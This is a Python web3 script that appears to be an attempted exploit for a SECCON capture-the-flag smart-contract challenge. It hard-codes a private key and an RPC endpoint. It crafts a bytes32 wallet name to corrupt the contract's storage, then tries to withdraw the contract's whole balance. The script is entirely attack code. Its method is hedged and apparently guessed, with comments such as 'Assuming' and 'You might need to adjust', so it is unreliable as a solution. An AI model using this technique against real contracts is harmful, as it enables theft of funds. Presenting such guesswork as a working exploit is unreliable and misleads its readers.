from web3 import Web3
import sys

# Configuration
RPC_ENDPOINT = "http://trillion-ether.seccon.games:8545/39aa3f0f-7798-4c05-ad91-0c6cd093487e"
PRIVATE_KEY = "0x17c5d2b07938134a078f40a2a02ece476d66e269045fc1c38b73a889ab9170c7"
ATTACKER_ADDRESS = "0x65ADbdcdb2D990197d2de5A804Ee3Ac538E61B09"
CONTRACT_ADDRESS = "0x058DfA7793150C129b6f9cec4aFdfE3a10Ad9828"

# Initialize Web3
w3 = Web3(Web3.HTTPProvider(RPC_ENDPOINT))
if not w3.isConnected():
    print("Failed to connect to the RPC endpoint.")
    sys.exit(1)

# Ensure the private key is prefixed with '0x'
if not PRIVATE_KEY.startswith("0x"):
    PRIVATE_KEY = "0x" + PRIVATE_KEY

# Set up the account
account = w3.eth.account.from_key(PRIVATE_KEY)
w3.eth.default_account = account.address

# Define the contract ABI
# Since we don't have the full ABI, we'll define only the necessary functions
contract_abi = [
    {
        "inputs": [
            {
                "internalType": "bytes32",
                "name": "name",
                "type": "bytes32"
            }
        ],
        "name": "createWallet",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "walletId",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

# Initialize the contract
contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=contract_abi)

# Function to create a malicious wallet
def create_malicious_wallet(name, value):
    txn = contract.functions.createWallet(name).buildTransaction({
        'from': ATTACKER_ADDRESS,
        'value': value,
        'nonce': w3.eth.get_transaction_count(ATTACKER_ADDRESS),
        'gas': 300000,
        'gasPrice': w3.toWei('1', 'gwei')
    })
    signed_txn = w3.eth.account.sign_transaction(txn, private_key=PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    print(f"createWallet transaction sent: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"createWallet transaction mined: {receipt.status}")

# Function to withdraw funds from a wallet
def withdraw_funds(wallet_id, amount):
    txn = contract.functions.withdraw(wallet_id, amount).buildTransaction({
        'from': ATTACKER_ADDRESS,
        'nonce': w3.eth.get_transaction_count(ATTACKER_ADDRESS),
        'gas': 300000,
        'gasPrice': w3.toWei('1', 'gwei')
    })
    signed_txn = w3.eth.account.sign_transaction(txn, private_key=PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    print(f"withdraw transaction sent: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"withdraw transaction mined: {receipt.status}")

# Function to check if the challenge is solved
def check_solved():
    solved = contract.functions.isSolved().call()
    print(f"isSolved: {solved}")
    return solved

# Exploitation Steps
def exploit():
    print("Starting exploitation...")

    # Step 1: Create a malicious wallet with a crafted name to manipulate wallets.length
    # Since 'name' is bytes32, we can set it to a value that represents a large number
    # For example, setting wallets.length to 1 by setting name to 0x...01
    # Alternatively, set it to a value that allows us to overwrite storage slots as needed

    # Example: Set wallets.length to 1
    malicious_name = w3.toBytes(hexstr='0x0000000000000000000000000000000000000000000000000000000000000001')
    create_malicious_wallet(malicious_name, 0)

    # Step 2: Create a legitimate wallet to push our manipulated wallet into the array
    legitimate_name = w3.toBytes(text='LegitWallet')
    create_malicious_wallet(legitimate_name, 0)

    # Step 3: Withdraw funds from the manipulated wallet
    # Assuming that the first wallet (walletId=0) now has a corrupted balance or ownership
    # You might need to adjust walletId based on how wallets.length was manipulated

    # For demonstration, we'll attempt to withdraw from walletId=0
    # Replace 'amount' with the contract's balance or a large number
    try:
        withdraw_funds(0, w3.eth.get_balance(CONTRACT_ADDRESS))
    except Exception as e:
        print(f"Error during withdrawal: {e}")

    # Step 4: Check if the challenge is solved
    check_solved()

if __name__ == "__main__":
    exploit()

